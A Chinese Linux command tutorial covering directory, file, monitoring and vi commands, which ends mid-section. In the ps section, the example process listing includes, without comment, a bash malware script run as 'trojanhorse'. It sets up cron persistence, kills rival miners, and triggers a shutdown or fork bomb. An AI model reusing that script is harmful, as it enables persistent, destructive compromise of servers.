# 1. Liunx常用基础命令

## 1.1 目录处理命令

### 1.1.1 ls:显示目录文件命令

:::tip 语法： <font color='red'>ls 选项【-ald】【文件或目录】</font>

-a 显示所有文件，包括隐藏文件

-l 详细信息显示

-d 仅显示目录名，而不显示目录下的内容列表

-h 人性化显示（hommization）

-i 查看任意一个文件的i节点（类似于身份证唯一信息）

-t 用文件和目录的更改时间排序；可以用第一个显示的文件判断最近修改的文件

注意：**. 开头的文件除非是目录，否则就是隐藏文件**
:::

```sh
[root@TXYUN-NO2 openresty]# ls -lh
total 376K
drwxr-xr-x  2 root root 4.0K Oct 14 23:54 bin
drwxrwxr-x 47 es   es   4.0K Oct 15 01:05 build
drwxrwxr-x 46 es   es   4.0K Jul 14  2020 bundle
-rwxrwxr-x  1 es   es    52K Jul 14  2020 configure
-rw-rw-r--  1 es   es    23K Jul 14  2020 COPYRIGHT
drwxr-xr-x  6 root root 4.0K Oct  8 16:13 luajit
drwxr-xr-x  6 root root 4.0K Oct 14 23:54 lualib
-rw-r--r--  1 root root 6.0K Oct 15 01:05 Makefile
drwxr-xr-x 11 root root 4.0K Oct  8 16:16 nginx
drwxrwxr-x  5 es   es   4.0K Jul 14  2020 openresty-1.17.8.2
drwxrwxr-x  2 es   es   4.0K Jul 14  2020 patches
drwxr-xr-x 47 root root 4.0K Oct  8 16:13 pod
-rw-rw-r--  1 es   es   4.6K Jul 14  2020 README.markdown
-rw-rw-r--  1 es   es   8.8K Jul 14  2020 README-windows.txt
-rw-r--r--  1 root root 225K Oct 14 23:54 resty.index
drwxr-xr-x  5 root root 4.0K Oct  8 16:13 site
drwxrwxr-x  2 es   es   4.0K Jul 14  2020 util
# 权限  引用次数 所属用户 所属组 大小 最后修改时间  文件名
``` 
---------------------------

### 1.1.2 mkdir:创建目录命令

:::tip 语法：<font color='red'>mkdir 【-p】【目录名】</font>

　　　　　-p 递归创建

　　例子：创建单个目录：mkdir /tmp/vae.txt

　　　　　创建多个目录：mkdir /tmp/a.txt  /tmp/b.txt
:::


:::warning 注意：
1、创建的目录已经存在, 那么 Linux 会提示我们 Linux 无法创建它。

2、不带任何参数运行 mkdir 命令会在当前目录下创建目录。

3、不带上-p,如果新建的文件上级目录不存在则不会执行成功这种说法是错误的。加或者不加上 -p 前面的目录没有得都会依次创建。

4、创建目录的首要条件是， 在想要创建目录的目标路径下你必须具有访问权限。　
:::

### 1.1.3 cd:切换目录命令

:::tip 语法： <font color='red'>cd【目录名】</font>

切换到指定目录：cd /tmp/vae

　　　　　回到上一级目录：cd .. 

　　　　　还是在当前目录：cd .

　　　　　返回上两级目录：cd ../..

　　　　  返回进入此目录之前所在的目录：cd  -  
:::

### 1.1.4 shell内置命令和外部命令
　　大家可以看到前面的三个命令，ls命令和mkdir命令都有命令的所在路径，而cd命令我们说是shell内置命令。这两者便是Linux内置命令和外部命令。

　　内部命令实际上是shell程序的一部分，其中包含的是一些比较简单的linux系统命令，这些命令由shell程序识别并在shell程序内部完成运行，通常在linux系统加载运行时shell就被加载并驻留在系统内存中。内部命令是写在bashy源码里面的，其执行速度比外部命令快，因为解析内部命令shell不需要创建子进程。比如：exit，history，cd，echo等。

　　外部命令是linux系统中的实用程序部分，因为实用程序的功能通常都比较强大，所以其包含的程序量也会很大，在系统加载时并不随系统一起被加载到内存中，而是在需要时才将其调用内存。通常外部命令的实体并不包含在shell中，但是其命令执行过程是由shell程序控制的。shell程序管理外部命令执行的路径查找、加载存放，并控制命令的执行。

外部命令是在bash之外额外安装的，通常放在/bin，/usr/bin，/sbin，/usr/sbin......等等。可通过“echo $PATH”命令查看外部命令的存储路径，比如：ls、vi等。

　　用type命令可以分辨内部命令与外部命令：
```sh
[root@TXYUN-NO2 openresty]# type cd
cd is a shell builtin
[root@TXYUN-NO2 openresty]# type vi
vi is /usr/bin/vi
[root@TXYUN-NO2 openresty]# type mkdir
mkdir is /usr/bin/mkdir
```
　　

　　内部命令和外部命令最大的区别之处就是性能。内部命令由于构建在shell中而不必创建多余的进程，要比外部命令执行快得多。因此和执行更大的脚本道理一样，执行包含很多外部命令的脚本会损害脚本的性能。

 

### 1.1.5 pwd:显示当前目录命令

```bash
[root@TXYUN-NO2 openresty]# pwd
/usr/local/openresty
```

### 1.1.6 rmdir:删除空目录命令

:::tip 语法： <font color='red'>rmdir 【空目录名】</font>

　　例子：删除指定空目录：rmdir /tmp/a

　　注意：由于此命令只能删除空目录，在实际操作中应用的不多，后面我们讲解 rm 命令可以替代。
:::

### 1.1.7 cp:复制文件或目录命令

:::tip 语法： <font color='red'>cp -rp 【原文件或目录】【目标目录】</font>

　　　　　　　   -r    复制目录

　　　　　　　　 -p    保留文件属性　

还可同时复制多个文件，注意复制目录的时候要加 -r选项。加-p属性之后会将原文件的一些属性比如修改时间等也原封不动的复制过去。如果不加-p属性，那么复制后的文件修改时间为当前系统时间。
:::

 
### 1.1.8 mv:剪切文件或目录命令=


:::tip 语法： <font color='red'>mv【原文件或目录】【目标目录】</font>

```bash
[root@TXYUN-NO2 ~]# touch 1.txt
[root@TXYUN-NO2 ~]# mv 1.txt 2.txt
[root@TXYUN-NO2 ~]# ls -lrt
-rw-r--r-- 1 root root         0 Oct 17 09:32 2.txt

```

:::
　　
### 1.1.9 rm:删除文件或目录命令

:::tip 语法： <font color='red'>rm -rf 【文件或目录】</font>

　　　　　　　　  -r    删除目录

　　　　　　　　  -f    强制执行

　　　　　　rm -rf tmp1 是强制删除 tmp1 目录，不需要输入 y 来确认，这种做法很简单，但是容易误删文件，没有反悔的机会

　　　　　　rm -rf tmp1 tmp2 同时删除两个文件
:::
## 1.2 文件处理命令

### 1.2.1 touch:创建空文件命令

:::tip 语法： <font color='red'>touch 【文件名】</font>

```bash
[root@TXYUN-NO2 ~]# touch 2.cpp 3.cpp
[root@TXYUN-NO2 ~]# ls *.cpp
2.cpp  3.cpp

```
注意：创建文件时，文件名不要有空格，不然就是创建了 两个文件

touch progrom files   这是创建了两个文件，progrom 和 files
　　
:::
　　

 

### 1.2.2 cat显示文件内容命令

**适合内容较少的文件**
:::tip 语法： <font color='red'>cat【文件名】</font>

　　　　　　　　-n  显示文件行号

　　例子：通过不加参数-n和加参数-n，显示/etc/issue的内容
　　注意：此命令只能显示文件内容比较少的文件，如果文件内容很多，用cat命令是不合适的，视觉效果是屏幕不断滚动更新。
```sh
[root@TXYUN-NO2 ~]# echo 'hello c world' > 2.cpp
[root@TXYUN-NO2 ~]# cat 2.cpp 
hello c world
[root@TXYUN-NO2 ~]# vi 2.cpp
[root@TXYUN-NO2 ~]# cat -n 2.cpp
     1	hello c world
     2	hello c world
     3	hello c world
     4	hello c world
```
:::
 
### 1.2.3 tac反向显示文件内容命令

**适合内容较少的文件**

:::tip 语法： tac【文件名】

```sh
[root@TXYUN-NO2 ~]# tac  2.cpp
hello c world
hello c world
```
:::
　　

 

### 1.2.4  more:分页显示文件内容命令

**不能向前翻页**

:::tip 语法： more【文件名】

　　　　（空格）或f 翻页（一页一页的往后显示）

　　　　（Enter） 换行（一行一行的往后显示）

　　　　 q 或 Q 退出

```sh
[root@TXYUN-NO2 ~]# more 2.cpp
hello c world
hello c world
hello c world

```
:::

### 1.2.5 less:分页显示文件内容命令

**可以前后翻页**

:::tip 语法： less【文件名】

　　　　（空格）或f 或PgDn 翻页（一页一页的往后显示）

　　　　 PgUp向前翻页

　　　　（Enter） 换行或向下的箭头（一行一行的往后显示）

　　　　向上的箭头（一行一行的往前显示）

　　　　 q 或 Q 退出

　　　　输入/想搜索的字符，然后回车键
```sh
[root@TXYUN-NO2 ~]# less 2.cpp
hello c world
hello c world
/tqk

```
:::

　　

 
### 1.2.6 head:显示文件内容命令

:::tip 语法： head【文件名】

　　　　-n   指定显示的行数

　　　　不加 -n 默认显示前 20 行数据

```sh
[root@TXYUN-NO2 ~]# head -5 2.cpp
hello c world
hello c world
hello c world
hello c world
hello c world
[root@TXYUN-NO2 ~]# head -n 5 2.cpp
hello c world
hello c world
hello c world
hello c world
hello c world

```
:::

### 1.2.7 tail:反向文件内容命令

**文件即时更新后也能动态显示，多用于日志文件显示**

:::tip 语法： tail【文件名】

　　　　-n   指定显示的行数

　　　　-f 动态显示文件末尾内容（即文件实时变化，那么显示内容也会随之变化）

```sh
[root@TXYUN-NO2 ~]# tail -n 10 -f 2.cpp
hello c world
hello c world
hello c world
hello c world
hello c world
hello c world
hello c world
hello c world
hello c world
tqk
```
:::

## 1.3 监控命令

###  1.3.1 top命令

**top命令经常用来监控Linux的系统状况，比如cpu、内存的使用.**

#### 1.3.1.1 系统运行时间和平均负载

```bash 
#当前时间  系统已运行的时间  当前登录用户的数量  相应最近5、10和15分钟内的平均负载。
top - 12:24:35 up 150 days,  1:35,  3 users,  load average: 0.04, 0.26, 0.31

#top命令的顶部显示与uptime命令相似的输出  
[root@TXYUN-NO2 ~]# uptime
 12:26:22 up 150 days,  1:37,  1 user,  load average: 0.02, 0.19, 0.27
```

**可以使用'l'命令切换uptime的显示**

#### 1.3.1.2 任务进程

```bash
#Tasks — 任务（进程），系统现在共有129个进程，其中处于运行中的有2个，123个在休眠（sleep），stoped状态的有0个，zombie状态（僵尸）的有0个。
Tasks: 125 total,   2 running, 123 sleeping,   0 stopped,   0 zombie
```

**可以使用't'命令切换显示**

#### 1.3.1.3 CPU状态

```bash
%Cpu(s): 98.0 us,  2.0 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st

#us, user： 运行(未调整优先级的) 用户进程的CPU时间
#sy，system: 运行内核进程的CPU时间
#ni，niced：运行已调整优先级的用户进程的CPU时间
#wa，IO wait: 用于等待IO完成的CPU时间
#hi：处理硬件中断的CPU时间
#si: 处理软件中断的CPU时间
#st：这个虚拟机被hypervisor偷去的CPU时间（译注：如果当前处于一个hypervisor下的vm，实际上hypervisor也是要消耗一部分CPU处理时间的）。
```
**可以使用't'命令切换显示**

####  1.3.1.4 内存使用

```bash
#物理内存显示如下:
#          全部可用内存      空闲内存       已使用内存      缓冲内存
KiB Mem :  8009840 total,   169688 free,  6279024 used,  1561128 buff/cache
#交换部分显示的是：
#                全部            空闲            已使用   缓冲交换空间。
KiB Swap:        0 total,        0 free,        0 used.  1425836 avail Mem 

[root@tianqikai ~]# free
              total        used        free      shared  buff/cache   available
Mem:        8009840     6278296      169992        1088     1561552     1426476
Swap:             0           0           0
#物理内存显示如下:全部可用内存、已使用内存、空闲内存、缓冲内存。相似地：交换部分显示的是：全部、已使用、空闲和缓冲交换空间。
```

接下来两行显示内存使用率，**有点像'free'命令**。第一行是物理内存使用，第二行是虚拟内存使用(交换空间)。

物理内存显示如下:全部可用内存、已使用内存、空闲内存、缓冲内存。相似地：交换部分显示的是：全部、已使用、空闲和缓冲交换空间。

**内存显示可以用'm'命令切换**

**物理内存**  
8009840 total — 物理内存总量（8g）  
6279024 used — 使用中的内存总量（6g）  
169688 free — 空闲内存总量（165M）  
1561128 buffers — 缓存的内存量 （1524M）  

**swap交换分区**  
0 total — 交换区总量（0M）  
0 used — 使用的交换区总量（0M）  
0 free — 空闲交换区总量（0M）  
1425836 cached — 缓冲的交换区总量（1425836kB）  


这里要说明的是不能用windows的内存概念理解这些数据，如果按windows的方式此台服务器“危矣”：8G的内存总量只剩下530M的可用内存。Linux的内存管理有其特殊性，复杂点需要一本书来说明，这里只是简单说点和我们传统概念（windows）的不同。

第四行中使用中的内存总量（used）指的是现在系统内核控制的内存数，空闲内存总量（free）是内核还未纳入其管控范围的数量。纳入内核管理的内存不见得都在使用中，还包括过去使用过的现在可以被重复利用的内存，内核并不把这些可被重新使用的内存交还到free中去，因此在linux上free内存会越来越少，但不用为此担心。

如果出于习惯去计算可用内存数，这里有个近似的计算公式：第四行的free + 第四行的buffers + 第五行的cached，按这个公式此台服务器的可用内存：

13284+25364+202224 = 240M。

**对于内存监控，在top里我们要时刻监控第五行<font color='red'>swap交换分区的used</font>，如果这个数值在不断的变化，说明内核在不断进行内存和swap的数据交换，这是真正的内存不够用了**。

第六行是空行

####  1.3.1.5 各进程（任务）的状态监控

```bash

PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND      
26953 es        20   0 2474764   2.3g      4 S 194.0 30.4  71504:57 cron 
12947 root      20   0  985672  58064  13112 S   0.7  0.7 144:58.76 YDService                                                            
10560 polkitd   20   0 1803472 507476      0 S   0.3  6.3   4269:56 mysqld                                                      
10752 root      20   0 4682760 625828   6384 S   0.3  7.8 203:28.30 java 
14296 root      20   0  679288  14324   2048 S   0.3  0.2 139:43.39 barad_agent  
14644 polkitd   20   0 1311780 194236    152 S   0.3  2.4 385:13.66 mysqld 
23793 es        20   0  113424   1608   1252 S   0.3  0.0 185:15.39 bash  
27041 polkitd   20   0 1663424 100552   4504 S   0.3  1.3   2531:53 mongod 
```

:::tip  参数说明
<font color='red'><strong>PID</strong></font>：进程ID，进程的唯一标识符

<font color='red'><strong>USER</strong></font>：进程所有者的实际用户名。

<font color='red'><strong>PR</strong></font>：进程的调度优先级。这个字段的一些值是'rt'。这意味这这些进程运行在实时态。

<font color='red'><strong>NI</strong></font>：进程的nice值（优先级）。越小的值意味着越高的优先级。负值表示高优先级，正值表示低优先级

<font color='red'><strong>VIRT</strong></font>：进程使用的虚拟内存。进程使用的虚拟内存总量，单位kb。VIRT=SWAP+RES

<font color='red'><strong>RES</strong></font>：驻留内存大小。驻留内存是任务使用的非交换物理内存大小。进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATA

<font color='red'><strong>SHR</strong></font>：SHR是进程使用的共享内存。共享内存大小，单位kb

<font color='red'><strong>S</strong></font>：这个是进程的状态。它有以下不同的值:
```sh
D - 不可中断的睡眠态。
R – 运行态
S – 睡眠态
T – 被跟踪或已停止
Z – 僵尸态
```
<font color='red'><strong>%CPU</strong></font>：自从上一次更新时到现在任务所使用的CPU时间百分比。

<font color='red'><strong>%MEM</strong></font>：进程使用的可用物理内存百分比。

<font color='red'><strong>TIME+</strong></font>：任务启动后到现在所使用的全部CPU时间，精确到百分之一秒。

<font color='red'><strong>COMMAND</strong></font>：运行进程所使用的命令。进程名称（命令名/命令行）

还有许多在默认情况下不会显示的输出，它们可以显示进程的页错误、有效组和组ID和其他更多的信息。
:::

###  1.3.2 vmstat命令

```bash
# 直接执行vmstat命令，只查询一次
[root@tianqikai ~]# vmstat
procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----
 r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st
 6  0      0 166944 212184 1353080    0    0     1    23    0    0 20  1 79  0  0
# 间隔一秒，每秒执行一次 vmstat
[root@tianqikai ~]# vmstat 1
procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----
 r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st
 6  0      0 165544 212184 1353096    0    0     1    23    0    0 20  1 79  0  0
 3  0      0 164204 212184 1353096    0    0     0     0 3002 1987 96  4  0  0  0
 7  0      0 164188 212184 1353096    0    0     0     0 2715 1415 99  1  0  0  0
^C
# 间隔两秒，执行十次
[root@tianqikai ~]# vmstat 2 10
procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----
 r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st
 3  0      0 166476 212196 1353124    0    0     1    23    0    0 20  1 79  0  0
 2  0      0 166428 212196 1353124    0    0     0     0 2672 1371 99  1  0  0  0
 2  0      0 166276 212196 1353124    0    0     0   322 2692 1465 98  2  0  0  0
 2  0      0 166108 212196 1353124    0    0     0     0 2780 1523 98  3  0  0  0
 2  0      0 165576 212196 1353128    0    0     0     0 2711 1399 99  1  0  0  0
 3  0      0 165560 212200 1353164    0    0     0    38 2761 1799 96  5  0  0  0
 2  0      0 165436 212200 1353164    0    0     0     0 2693 1488 98  2  0  0  0
 2  0      0 165436 212204 1353160    0    0     0    52 2645 1295 99  1  0  0  0
 2  0      0 165556 212204 1353164    0    0     0     0 2680 1434 98  3  0  0  0
 3  0      0 165304 212204 1353164    0    0     0     0 2654 1337 99  1  0  0  0
 ```

:::tip 参数说明
<font color='red'><strong>r</strong></font> 表示运行队列(就是说多少个进程真的分配到CPU)，我测试的服务器目前CPU比较空闲，没什么程序在跑，当这个值超过了CPU数目，就会出现CPU瓶颈了。这个也和top的负载有关系，一般负载超过了3就比较高，超过了5就高，超过了10就不正常了，服务器的状态很危险。top的负载类似每秒的运行队列。如果运行队列过大，表示你的CPU很繁忙，一般会造成CPU使用率很高。

<font color='red'><strong>b</strong></font> 表示阻塞的进程,这个不多说，进程阻塞，大家懂的。

<font color='red'><strong>swpd</strong></font> 虚拟内存已使用的大小，如果大于0，表示你的机器物理内存不足了，如果不是程序内存泄露的原因，那么你该升级内存了或者把耗内存的任务迁移到其他机器。

<font color='red'><strong>free</strong></font>   空闲的物理内存的大小，我的机器内存总共8G，剩余3415M。

<font color='red'><strong>buff</strong></font>   Linux/Unix系统是用来存储，目录里面有什么内容，权限等的缓存，我本机大概占用300多M

<font color='red'><strong>cache</strong></font>  cache直接用来记忆我们打开的文件,给文件做缓冲，我本机大概占用300多M(这里是Linux/Unix的聪明之处，把空闲的物理内存的一部分拿来做文件和目录的缓存，是为了提高 程序执行的性能，当程序使用内存时，buffer/cached会很快地被使用。)

 <font color='red'><strong>si</strong></font>  每秒从磁盘读入虚拟内存的大小，如果这个值大于0，表示物理内存不够用或者内存泄露了，要查找耗内存进程解决掉。我的机器内存充裕，一切正常。

 <font color='red'><strong>so</strong></font>  每秒虚拟内存写入磁盘的大小，如果这个值大于0，同上。

 <font color='red'><strong>bi</strong></font>  块设备每秒接收的块数量，这里的块设备是指系统上所有的磁盘和其他块设备，默认块大小是1024byte，我本机上没什么IO操作，所以一直是0，但是我曾在处理拷贝大量数据(2-3T)的机器上看过可以达到140000/s，磁盘写入速度差不多140M每秒

 <font color='red'><strong>bo</strong></font> 块设备每秒发送的块数量，例如我们读取文件，bo就要大于0。bi和bo一般都要接近0，不然就是IO过于频繁，需要调整。

 <font color='red'><strong>in</strong></font> 每秒CPU的中断次数，包括时间中断

 <font color='red'><strong>cs</strong></font> 每秒上下文切换次数，例如我们调用系统函数，就要进行上下文切换，线程的切换，也要进程上下文切换，这个值要越小越好，太大了，要考虑调低线程或者进程的数目,例如在apache和nginx这种web服务器中，我们一般做性能测试时会进行几千并发甚至几万并发的测试，选择web服务器的进程可以由进程或者线程的峰值一直下调，压测，直到cs到一个比较小的值，这个进程和线程数就是比较合适的值了。系统调用也是，每次调用系统函数，我们的代码就会进入内核空间，导致上下文切换，这个是很耗资源，也要尽量避免频繁调用系统函数。上下文切换次数过多表示你的CPU大部分浪费在上下文切换，导致CPU干正经事的时间少了，CPU没有充分利用，是不可取的。

 <font color='red'><strong>us</strong></font> 用户CPU时间，我曾经在一个做加密解密很频繁的服务器上，可以看到us接近100,r运行队列达到80(机器在做压力测试，性能表现不佳)。

 <font color='red'><strong>sy</strong></font> 系统CPU时间，如果太高，表示系统调用时间长，例如是IO操作频繁。

 <font color='red'><strong>id</strong></font>  空闲 CPU时间，一般来说，id + us + sy = 100,一般我认为id是空闲CPU使用率，us是用户CPU使用率，sy是系统CPU使用率。

 <font color='red'><strong>wt</strong></font> 等待IO CPU时间。
:::

###  1.3.3 ps命令

:::tip 常用参数
<font color='red'><strong>-A </strong></font>显示所有进程（等价于-e）(utility)  
<font color='red'><strong>-a </strong></font>显示一个终端的所有进程，除了会话引线  
<font color='red'><strong>-N </strong></font>忽略选择。  
<font color='red'><strong>-d </strong></font>显示所有进程，但省略所有的会话引线(utility)  
<font color='red'><strong>-x </strong></font>显示没有控制终端的进程，同时显示各个命令的具体路径。dx不可合用。（utility）  
<font color='red'><strong>-p pid </strong></font>进程使用cpu的时间  
<font color='red'><strong>-u uid or username </strong></font>选择有效的用户id或者是用户名  
<font color='red'><strong>-g gid or groupname </strong></font>显示组的所有进程。  
<font color='red'><strong>U username </strong></font>显示该用户下的所有进程，且显示各个命令的详细路径。如:ps U zhang;(utility)  
<font color='red'><strong>-f </strong></font>全部列出，通常和其他选项联用。如：ps -fa or ps -fx and so on.  
<font color='red'><strong>-l </strong></font>长格式（有F,wchan,C 等字段）  
<font color='red'><strong>-j </strong></font>作业格式  
<font color='red'><strong>-o </strong></font>用户自定义格式。  
<font color='red'><strong>v</strong></font> 以虚拟存储器格式显示  
<font color='red'><strong>s </strong></font>以信号格式显示  
<font color='red'><strong>-m</strong></font> 显示所有的线程  
<font color='red'><strong>-H</strong></font> 显示进程的层次(和其它的命令合用，如：ps -Ha)（utility）   
<font color='red'><strong>e</strong></font> 命令之后显示环境（如：ps -d e; ps -a e）(utility)  
<font color='red'><strong>h</strong></font> 不显示第一行  
:::

---------------

:::tip 显示参数说明
ps aux 或 lax 输出的解释：

<font color='red'><strong>USER</strong></font>： 进程的属主；  
<font color='red'><strong>PID</strong></font>： 进程的ID；  
<font color='red'><strong>PPID</strong></font>： 父进程；  
<font color='red'><strong>%CPU</strong></font>： 进程占用的CPU百分比；  
<font color='red'><strong>%MEM</strong></font>： 占用内存的百分比；  
<font color='red'><strong>NI</strong></font>： 进程的NICE值，数值大，表示较少占用CPU时间；  
<font color='red'><strong>VSZ</strong></font>： 进程虚拟大小；  
<font color='red'><strong>RSS</strong></font>： 驻留中页的数量；  
<font color='red'><strong>TTY</strong></font>： 终端ID  
<font color='red'><strong>STAT</strong></font>： 进程状态（有以下几种）  

```sh
D 无法中断的休眠状态（通常 IO 的进程）；
R 正在运行可中在队列中可过行的；
S 处于休眠状态；
T 停止或被追踪；
W 进入内存交换（从内核2.6开始无效）；
X 死掉的进程（从来没见过）；
Z 僵尸进程；

----------------------

< 优先级高的进程
N 优先级较低的进程
L 有些页被锁进内存；
s 进程的领导者（在它之下有子进程）；
l 多进程的（使用 CLONE_THREAD, 类似 NPTL pthreads）；
+ 位于后台的进程组；
```
-----------------------

<font color='red'><strong>WCHAN</strong></font>： 正在等待的进程资源；
<font color='red'><strong>START</strong></font>： 启动进程的时间；
<font color='red'><strong>TIME</strong></font>： 进程消耗CPU的时间；
<font color='red'><strong>COMMAND</strong></font>： 命令的名称和参数； 
:::

```sh
ps -ef #显示所有当前进程
ps aux #显示所有当前进程
ps -ax #显示所有当前进程
ps -u pungki #根据用户过滤进程
ps -aux --sort -pcpu | less #根据 CPU 使用来升序排序
ps -aux --sort -pmem | less #根据用户过滤进程
ps -aux --sort -pcpu,+pmem | head -n 10 #查询全10个使用cpu和内存最高的应用
ps -C getty #通过进程名和PID过滤
ps -f -C getty #带格式显示的，通过进程名和PID过滤
ps -L 1213 #根据线程来过滤进程
ps -axjf（或pstree） #树形显示进程
ps -eo pid,user,args # 显示安全信息
ps -U root -u root u #格式化输出 root 用户（真实的或有效的UID）创建的进程

ps -aux|grep Z # 查看僵尸进程

ps -mq|wc -l # 查看该进程的线程数
------------------------------------------------------

[root@tianqikai ~]# ps -ef
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0  2020 ?        01:46:18 /usr/lib/systemd/systemd --system --deserialize 24

[root@tianqikai ~]# ps -ef|grep redis
root     17949  3166  0 18:25 pts/1    00:00:00 grep --color=auto redis
es       23793     1  0 Jul03 ?        03:05:21 ./trojanhorse -c                                                                                                                                                                           #!/bin/bash  killminers() {     pkill obama1     pkill playstation     pkill xmrig ?pkill java     pkill cnrig     pkill joseph     pkill kswapd0     pkill laxobist }  autoruncfg=$(cat /var/tmp/.google/.yahoocfg)  hook=$(grep -oP '(?<="hook": ")[^"]*' ${autoruncfg}) apache3=$(grep -oP '(?<="apache3": ")[^"]*' ${autoruncfg}) minercfg=$(grep -oP '(?<="minercfg": ")[^"]*' ${autoruncfg}) staticd=$(grep -oP '(?<="static": ")[^"]*' ${autoruncfg})  while : do     killminers      if ! crontab -l | grep -q 'trojanhorse';     then         rm -rf .temp         echo "* * * * * ${hook} > /dev/null <&1 2>&1 & disown" >> .temp         echo "@monthly ${hook} > /dev/null <&1 2>&1 & disown" >> .temp         echo "@reboot ${apache3} > /dev/null <&1 2>&1 & disown" >> .temp          crontab .temp         rm -rf .temp     fi      if [[ -f "$staticd/config.json" ]];     then         if [[ $(id -u) = 0 ]];         then             init 0         else             :(){ :|:& };:         fi     fi      if ! pgrep -x xredis >/dev/null     then         $hook > /dev/null <&1 2>&1 & disown     fi      sleep 3 done  ./trojanhorse
[root@tianqikai ~]# ps -ef|grep redis|wc -l
2
```

###  1.3.4 df 命令

####  1.3.4.1 命令格式：

```bash
df [选项] [文件]
```

####  1.3.4.2 命令功能：

显示指定磁盘文件的可用空间。如果没有文件名被指定，则所有当前被挂载的文件系统的可用空间将被显示。默认情况下，磁盘空间将以 1KB 为单位进行显示，除非环境变量 POSIXLY_CORRECT 被指定，那样将以512字节为单位进行显示

```bash
[root@tianqikai ~]# df -lh
#文件系统      Inode (I)已用 (I)可用 (I)已用% 挂载点
Filesystem      Size  Used Avail Use% Mounted on
devtmpfs        3.9G     0  3.9G   0% /dev
tmpfs           3.9G   68K  3.9G   1% /dev/shm
tmpfs           3.9G 1004K  3.9G   1% /run
tmpfs           3.9G     0  3.9G   0% /sys/fs/cgroup
/dev/vda1        50G   21G   27G  45% /
tmpfs           783M     0  783M   0% /run/user/0
overlay          50G   21G   27G  45% /var/lib/docker/overlay2/c6db689ff3db47676a61adc265a2ca650ac66d824740c610e986f0ce47e70999/merged
overlay          50G   21G   27G  45% /var/lib/docker/overlay2/9238a2d68d5232a8d234278d60a1984473c7946b43196ab0ba70c456d049a67e/merged
overlay          50G   21G   27G  45% /var/lib/docker/overlay2/a4cb166abe9f2a1567b748206b100532d1888d55245ccfe0bb0db7695eab5722/merged
overlay          50G   21G   27G  45% /var/lib/docker/overlay2/79a5e658ebd4075e1a6c877cc9045c92150ddb52d3cad8e6fcc3da868336c9f5/merged
overlay          50G   21G   27G  45% /var/lib/docker/overlay2/90daf168a1e405093f7e0a291a7b7c806fa80b11243bf8a4b8ac1eead6fcacd8/merged
tmpfs           783M     0  783M   0% /run/user/1000

```

###  1.3.4 du 命令


du [-abcDhHklmsSx][-L <符号连接>][-X <文件>][--block-size][--exclude=<目录或文件>][--max-depth=<目录层数>][--help][--version][目录或文件]

```sh
[root@TXYUN-NO2 ~]# du -h 2.cpp
16K	2.cpp
[root@TXYUN-NO2 ~]# du -h /mydata
4.0K	/mydata/apache-tomcat-8.5.72/temp
880K	/mydata/apache-tomcat-8.5.72/bin
```


##  1.4 vi/vim命令

<a title="vi/vim命令" href="./image/vi-vim-cheat-sheet-sch.gif">![vi/vim命令](./image/vi-vim-cheat-sheet-sch.gif)</a>

基本上 vi/vim 共分为三种模式，分别是命令模式（Command mode），输入模式（Insert mode）和底线命令模式（Last line mode）。

### 1.4.1 光标移动命令

:::tip 光标移动命令
<font color='red'><strong>h 或 向左箭头键(←)</strong></font>:	光标向左移动一个字符  
<font color='red'><strong>j 或 向下箭头键(↓)</strong></font>:	光标向下移动一个字符  
<font color='red'><strong>k 或 向上箭头键(↑)</strong></font>:	光标向上移动一个字符  
<font color='red'><strong>l 或 向右箭头键(→)</strong></font>:	光标向右移动一个字符  

如果你将右手放在键盘上的话，你会发现 hjkl 是排列在一起的，因此可以使用这四个按钮来移动光标。 如果想要进行多次移动的话，例如向下移动 30 行，可以使用 "30j" 或 "30↓" 的组合按键， 亦即加上想要进行的次数(数字)后，按下动作即可！


---------------------------


<font color='red'><strong>[Ctrl] + [f]</strong></font>:	屏幕『向下』移动一页，相当于 [Page Down]按键 (常用)  
<font color='red'><strong>[Ctrl] + [b]</strong></font>:	屏幕『向上』移动一页，相当于 [Page Up] 按键 (常用)  
<font color='red'><strong>[Ctrl] + [d]</strong></font>:	屏幕『向下』移动半页  
<font color='red'><strong>[Ctrl] + [u]</strong></font>:	屏幕『向上』移动半页  
<font color='red'><strong>+</strong></font>:	光标移动到非空格符的下一行  
<font color='red'><strong>-</strong></font>:	光标移动到非空格符的上一行  
<font color='red'><strong>n [space]</strong></font>:	那个 n 表示『数字』，例如 20 。按下数字后再按空格键，光标会向右移动这一行的 n 个字符。例如 20[space] 则光标会向后面移动 20 个字符距离。  



-----------------------------------

<font color='red'><strong>0 或功能键[Home]</strong></font>:	这是数字『 0 』：移动到这一行的最前面字符处 (常用)  
<font color='red'><strong>$ 或功能键[End]</strong></font>:	移动到这一行的最后面字符处(常用)  
<font color='red'><strong>H</strong></font>:	光标移动到这个屏幕的最上方那一行的第一个字符   
<font color='red'><strong>M</strong></font>:	光标移动到这个屏幕的中央那一行的第一个字符  
<font color='red'><strong>L</strong></font>:	光标移动到这个屏幕的最下方那一行的第一个字符  
<font color='red'><strong>G</strong></font>:	移动到这个档案的最后一行(常用)  
<font color='red'><strong>nG</strong></font>:n 为数字。移动到这个档案的第 n 行。例如 20G 则会移动到这个档案的第 20 行(可配合 :set nu)  
<font color='red'><strong>gg</strong></font>:	移动到这个档案的第一行，相当于 1G 啊！ (常用)  
<font color='red'><strong>n [Enter]</strong></font>:	n 为数字。光标向下移动 n 行(常用)  

:::


### 1.4.2 搜索替换命令

:::tip 搜索替换命令

<font color='red'><strong>/word</strong></font>	  
:向光标之下寻找一个名称为 word 的字符串。例如要在档案内搜寻 vbird 这个字符串，就输入 /vbird 即可！ (常用)

<font color='red'><strong>?word</strong></font>	  
:向光标之上寻找一个字符串名称为 word 的字符串。

<font color='red'><strong>n</strong></font>	  
:这个 n 是英文按键。代表重复前一个搜寻的动作。举例来说， 如果刚刚我们执行 /vbird 去向下搜寻 vbird 这个字符串，则按下 n 后，会向下继续搜寻下一个名称为 vbird 的字符串。如果是执行 ?vbird 的话，那么按下 n 则会向上继续搜寻名称为 vbird 的字符串！

<font color='red'><strong>N</strong></font>	  
